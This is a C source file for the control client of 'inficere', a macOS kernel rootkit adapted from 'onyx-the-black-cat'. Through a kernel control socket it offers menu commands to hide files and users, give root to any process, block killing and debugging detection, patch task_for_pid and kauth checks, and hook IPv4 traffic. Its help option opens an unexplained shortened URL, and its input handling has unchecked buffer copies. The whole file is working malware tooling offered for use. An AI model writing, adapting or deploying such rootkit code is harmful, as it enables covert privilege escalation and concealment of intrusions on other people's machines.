/*
 * Copyright (c) fG!, 2011, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Original code from "onyx-the-black-cat". Modified by Enzo Matsumiya (@enzolovesbacon).
 *
 * Copyright (c) 2013, Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/kern_control.h>
#include <sys/kern_event.h>
#include <sys/sys_domain.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>
#include <mach/mach.h>
#include <mach/mach_types.h>
#include <mach/i386/thread_status.h>
#include <mach/mach_vm.h>
#include "shared_data.h"

static int g_socket = -1;
int pid_is_set = 0;

int connect_to_kernel(void);
void print_menu(void);
void execute_cmd(int cmd, char *args);
void main_menu(void);

int connect_to_kernel(void)
{
	struct sockaddr_ctl sc = { 0 };
	struct ctl_info ctl_info = { 0 };
	int retv = 0;
	
	g_socket = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
	
	if(g_socket < 0) {
		printf("[ERROR] Failed to create socket.\n\n");
		printf("Try running this as root.\n");
		
		exit(1);
	}
	
	/* the control ID is dynamically generated so we must obtain sc_id using ioctl */
	memset(&ctl_info, 0, sizeof(ctl_info));
	strncpy(ctl_info.ctl_name, BUNDLE_ID, MAX_KCTL_NAME);
	ctl_info.ctl_name[MAX_KCTL_NAME - 1] = '\0';
	
	if(ioctl(g_socket, CTLIOCGINFO, &ctl_info) == -1) {
		printf("[ERROR] ioctl CTLIOCGINFO failed.\n");
		
		exit(1);
	}
	
	bzero(&sc, sizeof(struct sockaddr_ctl));
	
	sc.sc_len = sizeof(struct sockaddr_ctl);
	sc.sc_family = AF_SYSTEM;
	sc.ss_sysaddr = AF_SYS_CONTROL;
	sc.sc_id = ctl_info.ctl_id;
	sc.sc_unit = 0;
	
	retv = connect(g_socket, (struct sockaddr *)&sc, sizeof(sc));
	
	if(retv) {
		printf("[ERROR] Connection failed.\n");
		
		exit(1);
	}
	
	return 0;
}

int my_printf(char *option, char *option_name, char *desc)
{
	return printf("%-4s%-32s%s", option, option_name, desc);
}

void print_menu(void)
{
	printf("+------------------+\n");
	printf("+ inficere control +\n");
	printf("+------------------+\n");
	printf("\n");
	
	my_printf("[1] ", "Set PID", "Set a PID for this session\n");
	my_printf("[2] ", "Enable anti-anti-ptrace", "Block PT_DENY_ATTACH/P_LNOATTACH\n");
	my_printf("[3] ", "Disable anti-anti-ptrace", "\n");
	my_printf("[4] ", "Enable anti-kill", "Disable killing a process\n");
	my_printf("[5] ", "Disable anti-kill", "\n");
	my_printf("[6] ", "Enable anti-sysctl", "Intercept an anti-debug call + hide process specified by option 1\n");
	my_printf("[7] ", "Disable anti-sysctl", "\n");
	//	my_printf("[8] ", "--------", "----\n");
	//	my_printf("[9] ", "--------", "----\n");
	my_printf("[a] ", "Hide file on", "Hide a file or directory\n");
	my_printf("[b] ", "Hide file off", "\n");
	my_printf("[c] ", "Give root to PID", "Promote a process to UID/GID 0\n");
	my_printf("[d] ", "Hook IP (IPv4) filter", "Intercept IPv4 packets\n");
	my_printf("[e] ", "Un-hook IP (IPv4) filter", "\n");
	my_printf("[f] ", "Patch task_for_pid()", "Patch it so we can do it like task_for_pid(0)\n");
	my_printf("[g] ", "Restore task_for_pid()", "\n");
	my_printf("[h] ", "Patch kauth", "Patch \"kauth_authorize_process\" to not deny request\n");
	my_printf("[i] ", "Restore kauth", "\n");
	my_printf("[j] ", "Patch resume flag", "Enable the resume flag bit\n");
	my_printf("[k] ", "Restore resume flag", "\n");
	my_printf("[l] ", "Activate single-step-on-branch", "Modify MSR_IA32_DEBUGCTLMSR to activate single-step-on-branch\n");
	my_printf("[m] ", "Restore single-step-on-branch", "\n");
	my_printf("[n] ", "Hide user on", "Hide a user from \"who\", \"w\"\n");
	my_printf("[o] ", "Hide user off", "\n");
	
	printf("\n");
	printf("[z or ?] Help\n");
	printf("[q] Exit\n");
}

void funz()
{
	system("open http://bit.ly/18QJOX7");
}

void execute_cmd(int cmd, char *args)
{
	char data[32] = { 0 };
	size_t data_len = 0;
	int retv;

	if(args != NULL) {
		memcpy(data, args, strlen(args));
	}
	
	data_len = strlen(data) + 1;
	
	retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);
	
	if(retv != 0) {
		printf("[ERROR] Kernel command execution failed:\n");
		printf("\t%s (%d)\n", strerror(errno), errno);
		
		return;
	}
}

void get_data()
{
	char *data = malloc(32);
	
	socklen_t data_len = 32;
	
	int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &data_len);
	
	if(retv != 0) {
		printf("[ERROR] getsockopt()\n");
		
		return;
	}
	
	size_t r = recv(g_socket, data, data_len, 0);

	if(r == 0) {
		printf("[ERROR] recv()\n");
		
		return;
	}
}

void main_menu()
{
	char str;
	
	do {
		printf("--> ");
		
		str = getchar();
		
		switch(str) {
			set_pid:
			case '1':
			{
				printf("\t--> Enter PID: ");
				
				char tmppid[8];
				
				scanf(" %s", tmppid);
				
				int pid = atoi(tmppid);
				
				if(pid <= 0 || pid > 99999) {
					printf("\tInvalid pid\n");
					
					break;
				}
				
				execute_cmd(SET_PID, tmppid);
				
				pid_is_set = 1;
				
				break;
			}
				
			case '2':
				printf("Anti-ptrace on\n");
				
				execute_cmd(ANTI_PTRACE_ON, NULL);
				
				break;
				
			case '3':
				printf("Anti-ptrace off\n");
				
				execute_cmd(ANTI_PTRACE_OFF, NULL);
				
				break;
				
			case '4':
				if(pid_is_set == 1) {
					printf("Anti-kill on\n");
					
					execute_cmd(ANTI_KILL_ON, NULL);
				} else {
					printf("You must first set a pid and then run desired command again!\n");
					
					goto set_pid;
				}
				
				break;
				
			case '5':
			{
				printf("Anti-kill off\n");
				
				execute_cmd(ANTI_KILL_OFF, NULL);
				
				break;
			}
				
			case '6':
				if(pid_is_set == 1) {
					printf("Anti-sysctl on\n");
					
					execute_cmd(ANTI_SYSCTL_ON, NULL);
				} else {
					printf("You must first set a pid and then run desired command again!\n");
					
					goto set_pid;
				}
				
				break;
				
			case '7':
			{
				printf("Anti-sysctl off\n");
				
				execute_cmd(ANTI_SYSCTL_OFF, NULL);
				
				break;
			}
				
			/*
			case '8':
				 break;
				 
			case '9':
				 break;
			 */
				
			case 'a':
			{
				char *tohide = malloc(256);
				
				printf("\t--> Enter file/directory name to hide (Only file/dir name, not path): ");
				
				if(scanf(" %256s", tohide) != 1) {
					printf("Invalid name\n");
					
					break;
				}
				
				unsigned long inputlen = strlen(tohide);
				
				if(inputlen == 0 || inputlen >= 255) {
					printf("Invalid name\n");
					
					break;
				}
				
				int i;
				
				for(i = 0; i < inputlen; i++) {
					if(tohide[i] == '/') {
						printf("Invalid name\n");
						
						break;
					}
				}
				
				execute_cmd(HIDE_FILE_ON, tohide);
				
				free(tohide);
				
				break;
			}
				
			case 'b':
				printf("Hide file off\n");
				
				execute_cmd(HIDE_FILE_OFF, NULL);
				
				break;
				
			case 'c':
			{
				printf("\t--> Enter PID to give root: ");
				
				char pid[8];
				
				scanf(" %s", pid);
				
				execute_cmd(GIVE_ROOT, pid);
				
				break;
			}
				
			case 'd':
				printf("IP filter hooked\n");
				
				execute_cmd(HOOK_IPF_ON, NULL);
				
				break;
				
			case 'e':
				printf("IP filter unhooked\n");
				
				execute_cmd(HOOK_IPF_OFF, NULL);
				
				break;
				
			case 'f':
				printf("Patched task_for_pid()\n");
				
				execute_cmd(PATCH_TASK_FOR_PID, NULL);
				
				break;
				
			case 'g':
				printf("Unpatched task_for_pid()\n");
				
				execute_cmd(UNPATCH_TASK_FOR_PID, NULL);
				
				break;
				
			case 'h':
				printf("Anti-kauth on\n");
				
				execute_cmd(ANTI_KAUTH_ON, NULL);
				
				break;
				
			case 'i':
				printf("Anti-kauth off\n");
				
				execute_cmd(ANTI_KAUTH_OFF, NULL);
				
				break;
				
			case 'j':
				printf("Patched resume flag\n");
				
				execute_cmd(PATCH_RESUME_FLAG, NULL);
				
				break;
				
			case 'k':
				printf("Unpatched resume flag\n");
				
				execute_cmd(UNPATCH_RESUME_FLAG, NULL);
				
				break;
				
			case 'l':
				printf("MSR bit patched\n");
				
				execute_cmd(PATCH_SINGLESTEP, NULL);
				
				break;
				
			case 'm':
				printf("MSR bit unpatched\n");
				
				execute_cmd(UNPATCH_SINGLESTEP, NULL);
				
				break;
				
			case 'n':
			{
				char *user_tohide = malloc(32);
				
				printf("\t--> Enter user name to hide: ");
				
				if(scanf(" %32s", user_tohide) != 1) {
					printf("Invalid name\n");
					
					break;
				}
				
				unsigned long inputlen = strlen(user_tohide);
				
				if(inputlen == 0 || inputlen >= 32) {
					printf("Invalid name\n");
					
					break;
				}
				
				int i;
				
				for(i = 0; i < inputlen; i++) {
					if(user_tohide[i] == ' ') {
						printf("Invalid name\n");
						
						break;
					}
				}
				
				execute_cmd(HIDE_USER_ON, user_tohide);
				
				free(user_tohide);
				
				break;
			}
				
			case 'o':
				printf("Hide user off\n");
				
				execute_cmd(HIDE_USER_OFF, NULL);
				
				break;
				
			case 'z':
				funz();
				
				break;
				
			case '?':
				funz();
				
				break;
				
			case 'q':
				printf("Quitting...\n");
				
				exit(0);
				
				break;
				
			case 'x':
				printf("Quitting...\n");
				
				exit(0);
				
				break;
				
			default:
				printf("Invalid selection!\n");
				
				break;
		}
	} while(getchar() != '\n');
}

int main(int argc, const char *argv[])
{
	if(connect_to_kernel()) {
		printf("[ERROR] Can't connect to kernel control socket!\n");
		
		exit(1);
	}
	
	print_menu();
	
	while(1) {
		main_menu();
	} return 0;
}

